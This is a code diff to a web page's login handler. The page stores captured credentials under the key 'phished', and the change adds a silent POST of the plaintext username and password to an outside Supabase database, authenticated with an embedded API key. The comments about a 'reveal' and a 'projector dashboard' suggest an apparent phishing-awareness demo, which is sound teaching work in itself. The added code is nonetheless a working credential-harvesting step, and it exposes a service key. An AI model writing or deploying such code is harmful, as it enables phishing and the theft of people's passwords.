@@ -466,8 +466,19 @@
 
             if (!username || !password) return false;
 
-            // Store in localStorage for the reveal later
+            // Store in localStorage for the individual reveal
             localStorage.setItem('phished', JSON.stringify({ u: username, p: password }));
+
+            // Send to Supabase (for projector dashboard)
+            fetch('https://omrrknnkudkawxkhplao.supabase.co/rest/v1/submissions', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcnJrbm5rdWRrYXd4a2hwbGFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMjczMDgsImV4cCI6MjA4ODYwMzMwOH0.8gbMXjn6rSiwCBjnp3YXkdkexPZAZDl4U8WD579ySEw',
+                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcnJrbm5rdWRrYXd4a2hwbGFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMjczMDgsImV4cCI6MjA4ODYwMzMwOH0.8gbMXjn6rSiwCBjnp3YXkdkexPZAZDl4U8WD579ySEw'
+                },
+                body: JSON.stringify({ username: username, password: password })
+            }).catch(function() {});
 
             // Show loading spinner
             document.getElementById('loadingOverlay').classList.add('active');
